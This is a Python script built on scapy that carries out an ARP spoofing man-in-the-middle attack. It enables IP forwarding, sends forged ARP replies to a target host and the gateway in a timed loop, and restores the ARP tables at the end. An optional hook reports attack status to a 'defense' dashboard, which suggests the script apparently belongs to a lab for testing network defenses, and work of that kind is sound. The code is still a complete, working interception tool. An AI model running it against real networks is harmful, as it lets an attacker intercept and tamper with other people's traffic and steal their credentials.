from scapy.all import ARP, Ether, srp, send, sendp
import time
import os
import subprocess
import sys

# Try to import dashboard integration
try:
    from defense.dashboard_integration import set_attack_status
    DASHBOARD_AVAILABLE = True
    print("[+] Dashboard integration available")
except ImportError:
    DASHBOARD_AVAILABLE = False
    print("[-] Dashboard integration not available")

def enable_ip_forwarding():
    """
    Enable IP forwarding safely, handling container restrictions
    """
    try:
        # Try the standard way first
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Check if it worked
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            if f.read().strip() == "1":
                print("[+] IP forwarding enabled successfully")
                return True
    except Exception as e:
        pass
        
    try:
        # Alternative method: using sysctl command
        result = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                               capture_output=True, text=True)
        if "net.ipv4.ip_forward = 1" in result.stdout:
            print("[+] IP forwarding enabled with sysctl")
            return True
    except Exception as e:
        pass
    
    # If we reach here, both methods failed
    print("[!] Could not enable IP forwarding due to container restrictions")
    print("[!] In a real-world attack, this would be required for traffic forwarding")
    print("[!] The ARP spoofing will still work, but packets won't be forwarded")
    return False

def disable_ip_forwarding():
    """
    Disable IP forwarding, handling container restrictions
    """
    try:
        # Try standard method
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    except:
        try:
            # Try sysctl method
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         capture_output=True, text=True)
        except:
            pass
    print("[*] IP forwarding disabled (or was never enabled)")

def get_mac(ip, interface="eth0"):
    """
    Get the MAC address of an IP host
    """
    try:
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0, iface=interface)[0]

        if len(result) > 0:
            return result[0][1].hwsrc
        else:
            # Try alternative method using direct ARP table lookup
            try:
                cmd = f"arp -n | grep {ip} | awk '{{print $3}}'"
                mac = subprocess.check_output(cmd, shell=True).decode().strip()
                if mac and mac != "":
                    return mac
            except:
                pass
            
            print(f"No response from {ip}")
            return None
    except Exception as e:
        print(f"Error getting MAC address for {ip}: {e}")
        return None
        
def spoof(target_ip, spoof_ip, interface="eth0"):
    """
    Spoof ARP table of the target IP
    """
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        print(f"Could not get MAC address for {target_ip}")
        return False

    # Create ARP packet to spoof target with proper Ethernet header
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
    ether = Ether(dst=target_mac)
    packet = ether/arp_response
    
    # Send the packet
    sendp(packet, verbose=0, iface=interface)
    
    print(f"Sent ARP spoof: {target_ip} -> {spoof_ip}")
    return True
    
def restore(target_ip, source_ip, interface="eth0"):
    """
    Restore the normal ARP table
    """
    target_mac = get_mac(target_ip, interface)
    source_mac = get_mac(source_ip, interface)

    if not target_mac or not source_mac:
        print("Could not get MAC addresses for restoration")
        return
    
    # Create properly formatted packets for restoration
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                      psrc=source_ip, hwsrc=source_mac, op=2)
    ether = Ether(dst=target_mac)
    packet = ether/arp_response
    
    # Send the packet to fix the ARP tables
    sendp(packet, verbose=0, count=5, iface=interface)
    print(f"ARP table restored for {target_ip}")

def get_my_ip(interface="eth0"):
    """Get the IP address of the current machine on the specified interface"""
    try:
        cmd = f"ip -4 addr show {interface} | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'"
        return subprocess.check_output(cmd, shell=True).decode().strip()
    except:
        return None
    
def arp_spoof_attack(gateway_ip, target_ip, interface="eth0", duration=60):
    """
    Execute ARP spoofing attack for a specified duration
    """
    ip_forwarding_enabled = False
    
    try:
        # Get the attacker's IP for dashboard reporting
        attacker_ip = get_my_ip(interface)
        
        # Update dashboard if available
        if DASHBOARD_AVAILABLE:
            set_attack_status(ongoing=True, attacker=attacker_ip, target=target_ip)
        
        # Enable IP forwarding - using our safe function
        ip_forwarding_enabled = enable_ip_forwarding()

        packets_sent = 0
        start_time = time.time()
        
        print(f"[*] Starting ARP spoofing attack. Duration: {duration}s")
        
        while time.time() - start_time < duration:
            # Spoof target, telling them we're the gateway
            if spoof(target_ip, gateway_ip, interface):
                packets_sent += 1
            
            # Spoof gateway, telling it we're the target
            if spoof(gateway_ip, target_ip, interface):
                packets_sent += 1
            
            time.sleep(2)  # Sleep to avoid flooding
            
        print(f"[*] Attack completed. Sent {packets_sent} packets.")
        
        # Restore the network
        print("[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip, interface)
        restore(gateway_ip, target_ip, interface)
        
        # Disable IP forwarding if we enabled it
        if ip_forwarding_enabled:
            disable_ip_forwarding()
            
        # Update dashboard that attack is over
        if DASHBOARD_AVAILABLE:
            set_attack_status(ongoing=False)
        
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C. Restoring ARP tables...")
        restore(target_ip, gateway_ip, interface)
        restore(gateway_ip, target_ip, interface)
        if ip_forwarding_enabled:
            disable_ip_forwarding()
            
        # Update dashboard that attack is over
        if DASHBOARD_AVAILABLE:
            set_attack_status(ongoing=False)
